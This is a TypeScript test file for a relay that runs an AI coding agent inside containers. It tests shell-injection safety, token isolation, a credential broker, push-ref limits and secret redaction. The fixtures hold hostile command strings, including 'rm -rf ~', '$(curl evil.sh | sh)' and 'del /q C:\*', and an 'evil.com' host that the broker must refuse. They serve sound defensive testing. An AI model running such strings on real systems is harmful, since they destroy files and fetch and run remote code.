import { describe, expect, it } from "bun:test";
import type { ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import { createConnection } from "node:net";
import {
	AGENT_ALLOWED_HOSTS,
	SETUP_ALLOWED_HOSTS,
	buildContainerArgs,
	buildOmpArgs,
	buildWorkspaceCloneArgs,
	cloneWorkspaceWithMirrorFallback,
	deriveMirrorPath,
	executeJob,
	fenceEnv,
	parseAllowedModels,
	scrubJobResult,
	startEgressProxy,
	startGitBroker,
	tryPrepareRepoMirror,
	withLock,
	type CloneFallbackDependencies,
	type ContainerRunOptions,
	type EgressProxyHandle,
	type GitBrokerHandle,
	type GitBrokerOptions,
	type Job,
	type MirrorDependencies,
	type MutexMap,
	type RunGitFn,
	type SpawnFn,
} from "../relay/relay";

// ─── Spawn test doubles ───────────────────────────────────────────────────────

/** Minimal ChildProcess double: capture spawn inputs, emit scripted output. */
class FakeChild extends EventEmitter {
	readonly stdout = new EventEmitter();
	readonly stderr = new EventEmitter();
	killed = false;

	kill(): boolean {
		this.killed = true;
		return true;
	}
}

interface SpawnCapture {
	command: string;
	args: readonly string[];
	options: { cwd: string; shell?: false; env?: NodeJS.ProcessEnv; detached?: boolean };
}

function makeSpawn(script: (child: FakeChild) => void): { spawn: SpawnFn; calls: SpawnCapture[] } {
	const calls: SpawnCapture[] = [];
	const spawnImpl: SpawnFn = (command, args, options) => {
		calls.push({ command, args, options });
		const child = new FakeChild();
		queueMicrotask(() => script(child));
		return child as unknown as ChildProcess;
	};
	return { spawn: spawnImpl, calls };
}

// ─── Fixtures ─────────────────────────────────────────────────────────────────

const WINDOWS_INJECTION = 'title" && del /q C:\\* && echo "pwned';
const POSIX_INJECTION = "title; rm -rf ~; $(curl evil.sh | sh) `reboot`";

const BASE_JOB: Job = {
	id: "job-1",
	issueId: "issue-1",
	issueIdentifier: "TEST-1",
	model: "combo-a",
	prompt: "do something",
	status: "leased",
	createdAt: "2026-01-01T00:00:00Z",
	attemptId: "attempt-1",
	leaseToken: "token-1",
};

// ─── parseAllowedModels ───────────────────────────────────────────────────────

describe("parseAllowedModels", () => {
	it("parses comma-separated ids and treats empty input as allow-nothing", () => {
		expect(parseAllowedModels("combo-a, combo-b ,")).toEqual(["combo-a", "combo-b"]);
		expect(parseAllowedModels("")).toEqual([]);
		expect(parseAllowedModels(undefined)).toEqual([]);
	});
});

// ─── buildOmpArgs ─────────────────────────────────────────────────────────────

describe("buildOmpArgs", () => {
	it("keeps shell metacharacters as one literal argv entry behind a -- separator", () => {
		for (const hostile of [WINDOWS_INJECTION, POSIX_INJECTION]) {
			const args = buildOmpArgs("combo-a", hostile);
			expect(args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", hostile]);
			// The prompt is one argv element, never split or rewritten.
			expect(args[args.length - 1]).toBe(hostile);
			// And it rides behind `--`, so a leading dash cannot become a flag.
			expect(args[args.indexOf("--") + 1]).toBe(hostile);
		}
	});

	it("keeps a flag-shaped prompt positional", () => {
		const args = buildOmpArgs("combo-a", "--api-key steal");
		expect(args.slice(args.indexOf("--"))).toEqual(["--", "--api-key steal"]);
	});
});

// ─── fence environment threading ─────────────────────────────────────────────

describe("fence environment threading", () => {
	it("passes the hooks env through to the spawned process verbatim", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		const env = {
			OMPK_FENCE_URL: "https://worker.test/fence-check",
			OMPK_FENCE_JOB: "job-1",
			OMPK_FENCE_ATTEMPT: "attempt-1",
			OMPK_FENCE_TOKEN: "token-1",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "core.hooksPath",
			GIT_CONFIG_VALUE_0: "/relay/git-hooks",
		};
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000, { env });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.options.env).toEqual(env);
	});

	it("spawns with the inherited environment when no hooks env is given", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(calls[0]!.options.env).toBeUndefined();
	});
});

// ─── executeJob ───────────────────────────────────────────────────────────────

describe("executeJob", () => {
	it("rejects a model that is not allowlisted without spawning anything", async () => {
		const { spawn, calls } = makeSpawn(() => {});
		const result = await executeJob(
			{ model: "model-injected-by-issue", prompt: "whatever" },
			["combo-a"],
			spawn,
			1_000,
		);
		expect(result.success).toBe(false);
		expect(result.error).toContain("allowlist");
		// Another relay may carry this model: retryable, not terminal.
		expect(result.failureClass).toBe("transient");
		expect(calls).toHaveLength(0);
	});

	it("dispatches an allowed model without a shell and returns the child's output", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.stdout.emit("data", "task complete");
			child.emit("close", 0);
		});
		const result = await executeJob({ model: "combo-a", prompt: WINDOWS_INJECTION }, ["combo-a"], spawn, 1_000);
		expect(result).toEqual({ success: true, output: "task complete", error: undefined });
		expect(calls).toHaveLength(1);
		const call = calls[0]!;
		// No shell: options carry no shell flag, and argv holds the hostile prompt verbatim.
		expect("shell" in call.options ? call.options.shell : undefined).toBeFalsy();
		expect(call.args[call.args.length - 1]).toBe(WINDOWS_INJECTION);
		expect(call.command).not.toContain(WINDOWS_INJECTION);
	});

	it("reports a failing exit code with stderr as the error", async () => {
		const { spawn } = makeSpawn(child => {
			child.stderr.emit("data", "model exploded");
			child.emit("close", 3);
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.error).toBe("model exploded");
		// Clean non-zero exits are deterministic: never auto-retried.
		expect(result.failureClass).toBe("permanent");
	});

	it("times out a hung child and kills it", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child; // never emits close
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 10);
		expect(result.success).toBe(false);
		expect(result.error).toContain("timed out");
		expect(result.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});

	it("classifies a spawn error as transient", async () => {
		const { spawn } = makeSpawn(child => {
			child.emit("error", new Error("EBUSY: omp binary locked"));
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.failureClass).toBe("transient");
	});
});

// ─── withLock (per-resource mutex) ───────────────────────────────────────────

describe("withLock", () => {
	it("serializes two concurrent callers with the same key", async () => {
		const map: MutexMap = new Map();
		const log: string[] = [];
		let releaseFirst!: () => void;
		const firstGate = new Promise<void>(r => {
			releaseFirst = r;
		});

		const first = withLock(map, "R", async () => {
			log.push("A-start");
			await firstGate;
			log.push("A-end");
		});
		const second = withLock(map, "R", async () => {
			log.push("B");
		});

		// Drain microtask queue: B must be waiting, not running.
		await Promise.resolve();
		await Promise.resolve();
		expect(log).toEqual(["A-start"]);

		releaseFirst();
		await Promise.all([first, second]);
		expect(log).toEqual(["A-start", "A-end", "B"]);
	});

	it("allows concurrent execution for different keys", async () => {
		const map: MutexMap = new Map();
		const started: string[] = [];
		let releaseA!: () => void;

		const a = withLock(map, "R1", async () => {
			started.push("A");
			await new Promise<void>(r => {
				releaseA = r;
			});
		});
		const b = withLock(map, "R2", async () => {
			started.push("B");
		});

		await b; // B completes immediately (different key, no wait).
		expect(started).toContain("A"); // A started concurrently.
		expect(started).toContain("B");
		releaseA();
		await a;
	});

	it("cleans up the map entry after the last caller completes", async () => {
		const map: MutexMap = new Map();
		await withLock(map, "R", async () => {});
		expect(map.has("R")).toBe(false);
	});

	it("propagates errors from fn without blocking subsequent waiters", async () => {
		const map: MutexMap = new Map();
		const log: string[] = [];

		const first = withLock(map, "R", async () => {
			log.push("A");
			throw new Error("intentional");
		});
		const second = withLock(map, "R", async () => {
			log.push("B");
		});

		await expect(first).rejects.toThrow("intentional");
		await second;
		expect(log).toEqual(["A", "B"]);
	});

	it("serializes three concurrent callers in FIFO order", async () => {
		const map: MutexMap = new Map();
		const order: number[] = [];

		// Queue all three before any run; the mutex guarantees FIFO delivery.
		const tasks = [
			withLock(map, "R", async () => { order.push(1); }),
			withLock(map, "R", async () => { order.push(2); }),
			withLock(map, "R", async () => { order.push(3); }),
		];
		await Promise.all(tasks);
		expect(order).toEqual([1, 2, 3]);
	});
});

// ─── fenceEnv ─────────────────────────────────────────────────────────────────

describe("fenceEnv", () => {
	it("sets fence triple and hooks path for a Linear job", () => {
		const env = fenceEnv(BASE_JOB);
		expect(env.OMPK_FENCE_URL).toMatch(/\/fence-check$/);
		expect(env.OMPK_FENCE_JOB).toBe("job-1");
		expect(env.OMPK_FENCE_ATTEMPT).toBe("attempt-1");
		expect(env.OMPK_FENCE_TOKEN).toBe("token-1");
		expect(env.GIT_CONFIG_COUNT).toBe("1");
		expect(env.GIT_CONFIG_KEY_0).toBe("core.hooksPath");
		expect(typeof env.GIT_CONFIG_VALUE_0).toBe("string");
		// No JIT token variables for non-GitHub jobs.
		expect(env.OMPK_TOKEN_URL).toBeUndefined();
		expect(env.GH_TOKEN).toBeUndefined();
		expect(env.GIT_CONFIG_KEY_1).toBeUndefined();
	});

	it("adds JIT token URL and credential helper for a GitHub job", () => {
		const job: Job = {
			...BASE_JOB,
			source: "github",
			githubToken: "ghs_lease_time_token",
			github: { owner: "acme", repo: "app", number: 99, defaultBranch: "main", installationId: 12345 },
		};
		const env = fenceEnv(job);
		// Lease-time token kept for gh CLI calls.
		expect(env.GH_TOKEN).toBe("ghs_lease_time_token");
		// JIT token endpoint for the credential helper.
		expect(env.OMPK_TOKEN_URL).toMatch(/\/github-token$/);
		// Second git config entry points to the credential helper.
		expect(env.GIT_CONFIG_COUNT).toBe("2");
		expect(env.GIT_CONFIG_KEY_1).toBe("credential.helper");
		expect(env.GIT_CONFIG_VALUE_1).toContain("ompk-git-credential");
	});

	it("omits JIT token variables when githubToken is absent on a GitHub job", () => {
		const job: Job = {
			...BASE_JOB,
			source: "github",
			// githubToken intentionally absent
			github: { owner: "a", repo: "b", number: 1, defaultBranch: "main", installationId: 1 },
		};
		const env = fenceEnv(job);
		// Falls back to Linear-style env: single config entry, no JIT vars.
		expect(env.GIT_CONFIG_COUNT).toBe("1");
		expect(env.OMPK_TOKEN_URL).toBeUndefined();
		expect(env.GH_TOKEN).toBeUndefined();
	});
});

// ─── scrubJobResult ───────────────────────────────────────────────────────────

describe("scrubJobResult", () => {
	it("replaces the secret in output and error", () => {
		const result = scrubJobResult(
			{ success: false, output: "using token ghs_abc123 failed", error: "token ghs_abc123 rejected" },
			"ghs_abc123",
		);
		expect(result.output).toBe("using token [redacted] failed");
		expect(result.error).toBe("token [redacted] rejected");
	});

	it("returns the result object unchanged when no secret is given", () => {
		const orig = { success: true, output: "done" };
		// Same reference: no allocation when secret is undefined.
		expect(scrubJobResult(orig, undefined)).toBe(orig);
	});

	it("redacts multiple occurrences of the secret", () => {
		const result = scrubJobResult(
			{ success: false, output: "tok tok tok", error: "tok" },
			"tok",
		);
		expect(result.output).toBe("[redacted] [redacted] [redacted]");
		expect(result.error).toBe("[redacted]");
	});

	it("leaves output unchanged when error is absent", () => {
		const result = scrubJobResult({ success: true, output: "tok in output" }, "tok");
		expect(result.output).toBe("[redacted] in output");
		expect(result.error).toBeUndefined();
	});
});

// ─── deriveMirrorPath ─────────────────────────────────────────────────────────

describe("deriveMirrorPath", () => {
	it("builds a path under .mirrors with owner-repo.git suffix", () => {
		expect(deriveMirrorPath("/root", "acme", "app")).toBe("/root/.mirrors/acme-app.git");
	});

	it("sanitizes characters that are unsafe on common filesystems", () => {
		const p = deriveMirrorPath("/root", "org/sub", "my:repo");
		// Slashes and colons are replaced; the path stays under .mirrors.
		expect(p).toContain("/.mirrors/");
		expect(p).not.toContain("/org/sub");
		expect(p).not.toContain(":");
	});

	it("produces a stable path for the same inputs", () => {
		const p1 = deriveMirrorPath("/ws", "owner", "repo");
		const p2 = deriveMirrorPath("/ws", "owner", "repo");
		expect(p1).toBe(p2);
	});
});

// ─── buildWorkspaceCloneArgs ──────────────────────────────────────────────────

describe("buildWorkspaceCloneArgs", () => {
	const CLONE_URL = "https://github.com/acme/app.git";
	const WS = "/tmp/ws-job-1";

	it("clones directly when no mirror is given", () => {
		const args = buildWorkspaceCloneArgs(CLONE_URL, WS, undefined);
		expect(args).toEqual(["clone", "--origin", "origin", CLONE_URL, WS]);
	});

	it("uses --reference-if-able and --dissociate when a mirror path is given", () => {
		const MIRROR = "/mirrors/acme-app.git";
		const args = buildWorkspaceCloneArgs(CLONE_URL, WS, MIRROR);
		expect(args).toContain("--reference-if-able");
		expect(args).toContain("--dissociate");
		expect(args).toContain(MIRROR);
		// URL and workspace are always present.
		expect(args).toContain(CLONE_URL);
		expect(args).toContain(WS);
	});
});

// ─── tryPrepareRepoMirror ─────────────────────────────────────────────────────

describe("tryPrepareRepoMirror", () => {
	const MIRROR_PATH = "/mirrors/acme-app.git";
	const CLONE_URL = "https://github.com/acme/app.git";

	function fakeDeps(opts: {
		exists?: boolean;
		gitImpl?: RunGitFn;
		warn?: (m: string) => void;
	}): MirrorDependencies {
		return {
			runGit: opts.gitImpl ?? (async () => {}),
			mirrorExists: async () => opts.exists ?? false,
			makeDir: async () => {},
			warn: opts.warn ?? (() => {}),
		};
	}

	it("clones a fresh mirror when none exists", async () => {
		const gitCalls: string[][] = [];
		const mirror = await tryPrepareRepoMirror(MIRROR_PATH, CLONE_URL, {}, undefined, {
			...fakeDeps({ exists: false, gitImpl: async args => { gitCalls.push([...args]); } }),
		});
		expect(mirror).toBe(MIRROR_PATH);
		expect(gitCalls[0]).toContain("clone");
		expect(gitCalls[0]).toContain("--mirror");
	});

	it("runs remote update --prune when the mirror already exists", async () => {
		const gitCalls: string[][] = [];
		const mirror = await tryPrepareRepoMirror(MIRROR_PATH, CLONE_URL, {}, undefined, {
			...fakeDeps({ exists: true, gitImpl: async args => { gitCalls.push([...args]); } }),
		});
		expect(mirror).toBe(MIRROR_PATH);
		expect(gitCalls[0]).toContain("remote");
		expect(gitCalls[0]).toContain("update");
		expect(gitCalls[0]).toContain("--prune");
	});

	it("returns undefined and warns when the git operation fails (degrade to full clone)", async () => {
		const warnings: string[] = [];
		const mirror = await tryPrepareRepoMirror(MIRROR_PATH, CLONE_URL, {}, undefined, {
			...fakeDeps({
				exists: false,
				gitImpl: async () => { throw new Error("network timeout"); },
				warn: m => warnings.push(m),
			}),
		});
		expect(mirror).toBeUndefined();
		expect(warnings).toHaveLength(1);
		expect(warnings[0]).toContain("full clone");
	});

	it("redacts the token from warning messages", async () => {
		const SECRET = "ghs_super_secret";
		const warnings: string[] = [];
		await tryPrepareRepoMirror(MIRROR_PATH, CLONE_URL, {}, SECRET, {
			...fakeDeps({
				exists: false,
				gitImpl: async () => { throw new Error(`git failed: ${SECRET}`); },
				warn: m => warnings.push(m),
			}),
		});
		expect(warnings[0]).not.toContain(SECRET);
		expect(warnings[0]).toContain("[redacted]");
	});
});

// ─── cloneWorkspaceWithMirrorFallback ─────────────────────────────────────────

describe("cloneWorkspaceWithMirrorFallback", () => {
	const CLONE_URL = "https://github.com/acme/app.git";
	const WORKSPACE = "/tmp/ws-job-1";
	const CWD = "/tmp/github-workspaces";

	it("clones directly when no mirror is provided", async () => {
		const gitCalls: string[][] = [];
		const deps: CloneFallbackDependencies = { runGit: async args => { gitCalls.push([...args]); } };
		await cloneWorkspaceWithMirrorFallback(CLONE_URL, WORKSPACE, undefined, CWD, {}, undefined, deps);
		expect(gitCalls).toHaveLength(1);
		expect(gitCalls[0]).not.toContain("--reference-if-able");
	});

	it("uses the mirror reference on the first attempt", async () => {
		const gitCalls: string[][] = [];
		const deps: CloneFallbackDependencies = { runGit: async args => { gitCalls.push([...args]); } };
		await cloneWorkspaceWithMirrorFallback(CLONE_URL, WORKSPACE, "/mirrors/m.git", CWD, {}, undefined, deps);
		expect(gitCalls).toHaveLength(1);
		expect(gitCalls[0]).toContain("--reference-if-able");
	});

	it("retries without the mirror when the reference clone fails", async () => {
		const gitCalls: string[][] = [];
		let attempt = 0;
		const deps: CloneFallbackDependencies = {
			runGit: async args => {
				gitCalls.push([...args]);
				if (attempt++ === 0) throw new Error("mirror object missing");
			},
			removeWorkspace: async () => {},
			warn: () => {},
		};
		await cloneWorkspaceWithMirrorFallback(CLONE_URL, WORKSPACE, "/mirrors/m.git", CWD, {}, undefined, deps);
		expect(gitCalls).toHaveLength(2);
		expect(gitCalls[0]).toContain("--reference-if-able"); // first attempt used mirror
		expect(gitCalls[1]).not.toContain("--reference-if-able"); // fallback is direct
	});

	it("redacts the token in fallback warning messages", async () => {
		const SECRET = "ghs_tok";
		const warnings: string[] = [];
		let attempt = 0;
		const deps: CloneFallbackDependencies = {
			runGit: async () => {
				if (attempt++ === 0) throw new Error(`git failed: token ${SECRET}`);
			},
			removeWorkspace: async () => {},
			warn: m => warnings.push(m),
		};
		await cloneWorkspaceWithMirrorFallback(CLONE_URL, WORKSPACE, "/mirrors/m.git", CWD, {}, SECRET, deps);
		expect(warnings[0]).not.toContain(SECRET);
		expect(warnings[0]).toContain("[redacted]");
	});
});

// ─── mirror lock + concurrency (via withLock) ─────────────────────────────────

describe("mirror locking under concurrent access", () => {
	it("serializes two mirror operations for the same path", async () => {
		const locks: MutexMap = new Map();
		const order: string[] = [];
		let releaseFirst!: () => void;
		const firstGate = new Promise<void>(r => { releaseFirst = r; });

		const op1 = withLock(locks, "/mirrors/acme-app.git", async () => {
			order.push("op1-start");
			await firstGate;
			order.push("op1-end");
		});
		const op2 = withLock(locks, "/mirrors/acme-app.git", async () => {
			order.push("op2");
		});

		await Promise.resolve();
		await Promise.resolve();
		expect(order).toEqual(["op1-start"]); // op2 is waiting.

		releaseFirst();
		await Promise.all([op1, op2]);
		expect(order).toEqual(["op1-start", "op1-end", "op2"]);
	});

	it("allows concurrent mirror operations for different repos", async () => {
		const locks: MutexMap = new Map();
		const started: string[] = [];

		let releaseA!: () => void;
		const a = withLock(locks, "/mirrors/acme-app.git", async () => {
			started.push("A");
			await new Promise<void>(r => { releaseA = r; });
		});
		const b = withLock(locks, "/mirrors/other-svc.git", async () => {
			started.push("B");
		});

		await b;
		// B finished; A must have started concurrently (different mirror path).
		expect(started).toContain("A");
		expect(started).toContain("B");
		releaseA();
		await a;
	});
});

// ─── Helpers used by broker tests ─────────────────────────────────────────────

/**
 * Build a minimal GitBrokerOptions with an injectable fetch double.
 * The workerTokenUrl is irrelevant for tests that don't exercise the
 * /credential endpoint (push-check tests).
 */
function makeBrokerOptions(
	fetchImpl: GitBrokerOptions["fetchImpl"],
	overrides?: Partial<GitBrokerOptions>,
): GitBrokerOptions {
	return {
		jobId: "job-1",
		attemptId: "attempt-1",
		leaseToken: "lease-1",
		workerTokenUrl: "https://worker.test/github-token",
		fetchImpl,
		...overrides,
	};
}

/** fetchImpl double that returns a JIT token response. */
function makeTokenFetch(token: string): GitBrokerOptions["fetchImpl"] {
	return async () =>
		new Response(JSON.stringify({ token }), {
			status: 200,
			headers: { "Content-Type": "application/json" },
		});
}

// ─── startGitBroker — credential endpoint ────────────────────────────────────

describe("startGitBroker — credential endpoint", () => {
	it("returns git credential lines for github.com via JIT token fetch", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("ghs_jit_fresh")));
		try {
			const res = await fetch(`${broker.url}/credential?host=github.com`);
			expect(res.status).toBe(200);
			const text = await res.text();
			expect(text).toContain("username=x-access-token");
			expect(text).toContain("password=ghs_jit_fresh");
		} finally {
			await broker.stop();
		}
	});

	it("refuses credentials for any host other than github.com", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("ghs_irrelevant")));
		try {
			for (const host of ["evil.com", "api.github.com", "raw.githubusercontent.com", ""]) {
				const res = await fetch(`${broker.url}/credential?host=${encodeURIComponent(host)}`);
				expect(res.status).toBe(403);
			}
		} finally {
			await broker.stop();
		}
	});

	it("returns 502 when the Worker JIT fetch fails", async () => {
		const failFetch: GitBrokerOptions["fetchImpl"] = async () =>
			new Response("internal error", { status: 500 });
		const broker = await startGitBroker(makeBrokerOptions(failFetch));
		try {
			const res = await fetch(`${broker.url}/credential?host=github.com`);
			expect(res.status).toBe(502);
		} finally {
			await broker.stop();
		}
	});

	it("returns 502 when the Worker response has no token field", async () => {
		const badFetch: GitBrokerOptions["fetchImpl"] = async () =>
			new Response(JSON.stringify({ other: "field" }), { status: 200 });
		const broker = await startGitBroker(makeBrokerOptions(badFetch));
		try {
			const res = await fetch(`${broker.url}/credential?host=github.com`);
			expect(res.status).toBe(502);
		} finally {
			await broker.stop();
		}
	});

	it("posts the fence triple to the Worker token URL", async () => {
		const captured: { url: string; body: string }[] = [];
		const recordFetch: GitBrokerOptions["fetchImpl"] = async (url, init) => {
			captured.push({ url: String(url), body: String(init?.body ?? "") });
			return new Response(JSON.stringify({ token: "ghs_t" }), { status: 200 });
		};
		const broker = await startGitBroker(
			makeBrokerOptions(recordFetch, {
				jobId: "j-99",
				attemptId: "att-5",
				leaseToken: "lse-abc",
				workerTokenUrl: "https://worker.test/github-token",
			}),
		);
		try {
			await fetch(`${broker.url}/credential?host=github.com`);
			expect(captured).toHaveLength(1);
			expect(captured[0]!.url).toBe("https://worker.test/github-token");
			const parsed = JSON.parse(captured[0]!.body) as Record<string, string>;
			expect(parsed["jobId"]).toBe("j-99");
			expect(parsed["attemptId"]).toBe("att-5");
			expect(parsed["leaseToken"]).toBe("lse-abc");
		} finally {
			await broker.stop();
		}
	});

	it("two broker instances bind to different ports", async () => {
		const b1 = await startGitBroker(makeBrokerOptions(makeTokenFetch("t1")));
		const b2 = await startGitBroker(makeBrokerOptions(makeTokenFetch("t2")));
		try {
			expect(b1.url).not.toBe(b2.url);
		} finally {
			await b1.stop();
			await b2.stop();
		}
	});
});

// ─── startGitBroker — push-check endpoint ─────────────────────────────────────

describe("startGitBroker — push-check endpoint", () => {
	/** Start a broker and POST /push-check with the given refs. */
	async function pushCheck(broker: GitBrokerHandle, refs: string[]): Promise<Response> {
		return fetch(`${broker.url}/push-check`, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ refs }),
		});
	}

	it("allows an empty refs list", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await pushCheck(broker, []);
			expect(res.status).toBe(200);
		} finally {
			await broker.stop();
		}
	});

	it("allows refs/heads/ompk/* refs", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await pushCheck(broker, [
				"refs/heads/ompk/issue-1-abc12345",
				"refs/heads/ompk/fix-something",
			]);
			expect(res.status).toBe(200);
		} finally {
			await broker.stop();
		}
	});

	it("rejects a push to refs/heads/main", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await pushCheck(broker, ["refs/heads/main"]);
			expect(res.status).toBe(403);
		} finally {
			await broker.stop();
		}
	});

	it("rejects a push to refs/heads/master", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await pushCheck(broker, ["refs/heads/master"]);
			expect(res.status).toBe(403);
		} finally {
			await broker.stop();
		}
	});

	it("rejects mixed refs when any ref is outside ompk/*", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			// One valid ompk/* ref + one forbidden ref — whole push must fail.
			const res = await pushCheck(broker, [
				"refs/heads/ompk/issue-5-deadbeef",
				"refs/heads/release/v2",
			]);
			expect(res.status).toBe(403);
		} finally {
			await broker.stop();
		}
	});

	it("rejects refs/heads/ompk-adjacent (must be refs/heads/ompk/ prefix)", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await pushCheck(broker, ["refs/heads/ompk-v2/issue-1"]);
			expect(res.status).toBe(403);
		} finally {
			await broker.stop();
		}
	});

	it("returns 404 for unknown routes", async () => {
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await fetch(`${broker.url}/unknown`);
			expect(res.status).toBe(404);
		} finally {
			await broker.stop();
		}
	});
});

// ─── buildContainerArgs — token isolation ─────────────────────────────────────

describe("buildContainerArgs — token isolation", () => {
	const OPTS: ContainerRunOptions = {
		image: "ompk-runner:latest",
		memory: "2g",
		pidsLimit: 512,
		gitHooksDir: "/tmp/test-hooks",
	};

	/** Collect --env K=V entries from the podman argv. */
	function envEntries(args: string[]): string[] {
		const out: string[] = [];
		for (let i = 0; i < args.length; i++) {
			if (args[i] === "--env" && i + 1 < args.length) out.push(args[i + 1]!);
		}
		return out;
	}

	const FENCE_ENV: NodeJS.ProcessEnv = {
		OMPK_FENCE_URL: "https://worker.test/fence-check",
		OMPK_FENCE_JOB: "job-1",
		OMPK_FENCE_ATTEMPT: "attempt-1",
		OMPK_FENCE_TOKEN: "token-1",
		GIT_CONFIG_COUNT: "2",
		GIT_CONFIG_KEY_0: "core.hooksPath",
		GIT_CONFIG_VALUE_0: "/host/git-hooks",  // must be overridden to container path
		GIT_CONFIG_KEY_1: "credential.helper",
		GIT_CONFIG_VALUE_1: "/host/git-hooks/ompk-git-credential",
		GH_TOKEN: "ghs_real_installation_token",
		OMPK_TOKEN_URL: "https://worker.test/github-token",
	};

	it("never puts GH_TOKEN in the container env when broker URL is provided", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "do something",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:12345");
		const entries = envEntries(args);
		expect(entries.every(e => !e.startsWith("GH_TOKEN="))).toBe(true);
	});

	it("never puts a raw token in the insteadOf URL rewrite", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "do something",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:12345");
		// No --env value should embed the token or the insteadOf pattern
		const joined = args.join(" ");
		expect(joined).not.toContain("ghs_real_installation_token");
		expect(joined).not.toContain("x-access-token:");
	});

	it("passes OMPK_BROKER_URL into the container env", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:9876");
		const entries = envEntries(args);
		expect(entries.some(e => e === "OMPK_BROKER_URL=http://127.0.0.1:9876")).toBe(true);
	});

	it("configures credential.helper to point to the container-side script", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:9876");
		const entries = envEntries(args);
		expect(entries.some(e => e === "GIT_CONFIG_KEY_1=credential.helper")).toBe(true);
		// Value must point to the container-internal path, not a host path
		const helperEntry = entries.find(e => e.startsWith("GIT_CONFIG_VALUE_1="));
		expect(helperEntry).toBeDefined();
		expect(helperEntry).toContain("/opt/ompk/git-hooks/ompk-git-credential");
	});

	it("overrides core.hooksPath to the container-internal hooks directory", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		// Env has host path; container args must remap it
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS);
		const entries = envEntries(args);
		const hooksEntry = entries.find(e => e.startsWith("GIT_CONFIG_VALUE_0="));
		expect(hooksEntry).toBe("GIT_CONFIG_VALUE_0=/opt/ompk/git-hooks");
	});

	it("does not include OMPK_BROKER_URL when no broker URL is given", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		// No brokerUrl argument → broker mode inactive
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS);
		const entries = envEntries(args);
		expect(entries.every(e => !e.startsWith("OMPK_BROKER_URL="))).toBe(true);
	});

	it("redirects OMPK_FENCE_URL to the broker fence-check when broker active", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:1");
		const entries = envEntries(args);
		// OMPK_FENCE_URL must route through the broker, not the Worker directly.
		// Container has no direct Worker connectivity when on an isolated network.
		expect(entries.some(e => e === "OMPK_FENCE_URL=http://127.0.0.1:1/fence-check")).toBe(true);
		// Fence identity vars still pass through for the fence check body.
		expect(entries.some(e => e === "OMPK_FENCE_JOB=job-1")).toBe(true);
		expect(entries.some(e => e === "OMPK_FENCE_ATTEMPT=attempt-1")).toBe(true);
		expect(entries.some(e => e === "OMPK_FENCE_TOKEN=token-1")).toBe(true);
	});

	it("does not forward OMPK_TOKEN_URL (Worker token URL) into the container", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV, OPTS, "http://127.0.0.1:1");
		const entries = envEntries(args);
		// OMPK_TOKEN_URL must NOT appear: the container uses the broker, not the Worker directly
		expect(entries.every(e => !e.startsWith("OMPK_TOKEN_URL="))).toBe(true);
	});
});
// ─── Egress allowlist constants ───────────────────────────────────────────────

describe("egress allowlist constants", () => {
	it("SETUP_ALLOWED_HOSTS includes github.com:443 and npm registry", () => {
		expect(SETUP_ALLOWED_HOSTS.has("github.com:443")).toBe(true);
		expect(SETUP_ALLOWED_HOSTS.has("registry.npmjs.org:443")).toBe(true);
		expect(SETUP_ALLOWED_HOSTS.has("pypi.org:443")).toBe(true);
